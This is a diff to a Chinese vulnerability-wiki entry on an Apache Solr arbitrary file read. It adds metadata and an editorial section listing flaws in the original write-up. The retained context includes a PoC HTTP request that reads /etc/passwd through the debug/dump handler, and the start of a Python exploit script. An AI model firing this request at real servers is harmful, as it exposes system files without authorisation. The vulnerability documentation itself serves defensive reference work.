@@ -1,8 +1,51 @@
 ---
-cve: "CVE-2019-0193"
+title: "（0day）Apache Solr 任意文件读取漏洞"
+product: "Apache Solr"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: "CVE-2019-0193"
+identifier_role: "reference"
+prerequisites: "core、未鉴权可写Config API、RemoteStreaming开启、dump处理器及文件权限"
+source_url: "https://mp.weixin.qq.com/s/1D4j7cF49yfrh1hErD_3OA"
+source_status: "recorded"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-b104930d900231626d95b010"
+entity_id: "ve-de8b594fcb39cfde9755d7b7"
+schema_version: "1"
+canonical: "Web安全/中间件/Apache Solr/Apache Solr 任意文件读取漏洞  1Day.md"
+relation_type: "duplicate_of"
 ---
 
 # （0day）Apache Solr 任意文件读取漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：core、未鉴权可写Config API、RemoteStreaming开启、dump处理器及文件权限
+- 证据范围：与203/212相同PeiQi脚本体系；frontmatter将脚本旧编号误作主CVE。
+
+### 本次正文校订
+
+- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 0193属于DIH而非此debug/dump机制，必须移除错误绑定
+- 手动流程遗漏启用RemoteStreaming，脚本中的启用JSON又含无效\}
+- This子串不能判配置成功，文件回显缺状态检查，空core不等于无漏洞
+- 0day没有日期、来源/版本证据；公网Origin/Referer残留
+- 持久配置变更未告知恢复；随便点目标的教学措辞应改授权实验
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1D4j7cF49yfrh1hErD_3OA)
@@ -19,7 +62,7 @@ app="Apache-Solr"
 
 POC 如下：  
 
-```
+```http
 POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
 Host: xxx.xxx.xxx.xxx:8983
 Content-Length: 29
@@ -39,7 +82,7 @@ stream.url=file:///etc/passwd
 
 当然我们也可以使用 PeiQi 师傅已经写好的 python 脚本  
 
-```
+```python
 import requests
 import sys
 import random
